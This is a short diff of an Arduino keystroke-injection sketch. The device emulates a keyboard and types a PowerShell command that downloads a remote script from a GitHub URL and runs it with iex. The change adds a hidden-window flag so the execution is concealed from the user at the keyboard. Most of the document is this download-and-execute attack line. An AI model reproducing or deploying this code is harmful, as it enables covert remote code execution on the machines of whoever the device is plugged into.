@@ -9,7 +9,7 @@ void setup() {
   Keyboard.releaseAll();
   delay(100);
   
-  Keyboard.println(F("powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/andreafioraldi/UnoRubber/master/powershell_payload.ps1')"));
+  Keyboard.println(F("powershell -windowstyle hidden iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/andreafioraldi/UnoRubber/master/powershell_payload.ps1')"));
 }
 
 void loop() {}
